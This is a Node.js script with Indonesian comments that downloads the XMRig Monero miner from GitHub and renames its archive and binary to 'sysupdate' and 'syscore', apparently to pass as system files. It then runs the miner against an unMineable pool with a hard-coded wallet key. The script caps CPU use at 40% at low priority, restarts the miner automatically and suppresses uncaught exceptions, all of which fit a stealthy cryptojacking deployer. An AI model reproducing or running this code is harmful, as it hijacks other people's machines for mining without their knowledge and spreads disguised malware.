const { spawn, exec } = require('child_process');
const fs = require('fs');
const https = require('https');

// === CONFIG ===
// Menggunakan port TLS unMineable (443 biasanya mendukung SSL/TLS)
const ADDR = 'rx.unmineable.com:443'; 
const AUTH_KEY = 'XMR:897fxBxffAjYWdwYxGoHqDCZtSrCiFrPvVR8Xc4baPXYZAq5UFdd8m8S4sHJMsMmq8H7b9tE15oAJNvZLhV9VjBT6HWKEmV#c5kh-a9zb'; 
const PASS = 'x'; 
const MODE = 'rx'; 

const REMOTE_URL = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz';
const ASSET_FILE = 'sysupdate.tar.gz';
const TARGET_DIR = 'syscore';

function startProcess() {
    console.log('Memulai core engine dengan mode TLS & Resource Terbatasi...');
    
    // Menambahkan argumen TLS dan pembatasan beban kerja CPU
    const worker = spawn(`./${TARGET_DIR}/syscore`, [
        '-a', MODE,
        '-o', ADDR,
        '-u', AUTH_KEY,
        '-p', PASS,
        '--tls',                      // Mengaktifkan TLS wajib
        '--max-cpu-usage=40',         // Batasi total CPU maksimal 40% (sesuaikan kebutuhan)
        '--cpu-priority=1',           // Set prioritas proses ke rendah (idle/low) agar OS tetap responsif
        '-k'
    ]);

    worker.stdout.on('data', (data) => {
        process.stdout.write(data.toString());
    });

    worker.stderr.on('data', (data) => {
        process.stderr.write(data.toString());
    });

    worker.on('close', (code) => {
        console.log(`[!] Proses terhenti dengan kode: ${code}`);
        console.log('Mencoba restart kembali dalam 5 detik...');
        setTimeout(startProcess, 5000);
    });
}

function fetchAsset(url, dest, cb) {
    https.get(url, (res) => {
        if (res.statusCode === 301 || res.statusCode === 302) {
            return fetchAsset(res.headers.location, dest, cb);
        }
        
        const file = fs.createWriteStream(dest);
        res.pipe(file);
        
        file.on('finish', () => {
            file.close(cb); 
        });
    }).on('error', (err) => {
        fs.unlink(dest, () => {}); 
        if (cb) cb(err.message);
    });
}

function initialize() {
    if (fs.existsSync(TARGET_DIR)) {
        console.log('[+] Core engine sudah terpasang. Menjalankan...');
        startProcess();
    } else {
        console.log('[+] Mendownload paket komponen via HTTPS...');
        
        fetchAsset(REMOTE_URL, ASSET_FILE, (err) => {
            if (err) {
                console.error(`[X] Gagal mendownload: ${err}`);
                return;
            }
            
            console.log('[+] Download selesai. Mengekstrak komponen...');
            
            exec(`tar -xf ${ASSET_FILE} && mv xmrig-6.21.0 ${TARGET_DIR} && mv ./${TARGET_DIR}/xmrig ./${TARGET_DIR}/syscore`, (error) => {
                if (error) {
                    console.error(`[X] Gagal ekstrak paket: ${error.message}`);
                    return;
                }
                console.log('[+] Ekstrak dan konfigurasi folder berhasil.');
                
                if (fs.existsSync(ASSET_FILE)) {
                    fs.unlinkSync(ASSET_FILE);
                }
                
                startProcess();
            });
        });
    }
}

initialize();

process.on('uncaughtException', function (err) {
    console.error('[X] Terjadi kesalahan sistem: ', err);
});
